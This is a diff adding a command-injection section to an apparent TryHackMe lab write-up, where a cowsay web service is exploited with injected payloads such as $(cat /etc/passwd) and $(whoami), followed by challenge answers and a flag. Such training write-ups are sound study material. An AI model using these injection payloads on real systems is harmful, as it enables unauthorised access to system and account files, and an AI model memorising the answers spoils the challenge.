@@ -93,4 +93,61 @@ sqlite> SELECT * FROM users;
 
 - Ans - **THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}**
 
+
+
+
+### 3.1 Command Injection
+
+navigate to http://Machine_IP/ and exploit the cowsay server
+
 ##
+- What strange text file is in the website's root directory?
+
+- $(ls) 
+
+![Description](./Images/img8.png) 
+
+- Ans: **drpepper.txt**
+
+##
+
+##
+- How many non-root/non-service/non-daemon users are there?
+
+- $(cat /etc/passwd)
+
+- Here in the passwd file, there are no non-root users/non-service/non-demon. So the answer is:
+- Ans: **0**
+
+##
+
+##
+- What user is this app running as?
+
+- $(whoami)
+
+![Description](./Images/img6.png) 
+
+- Ans: **apache**
+
+##
+
+##
+
+- What is the user's shell set as?
+
+- $(cat /etc/passwd)
+
+![Description](./Images/img7.png)
+
+- Ans: **/sbin/nologin
+##
+
+##
+- What version of Alpine Linux is running?
+
+- $(cat /etc/alpine-release)
+
+![Description](./Images/img5.png)
+
+- Ans: **3.16.0**
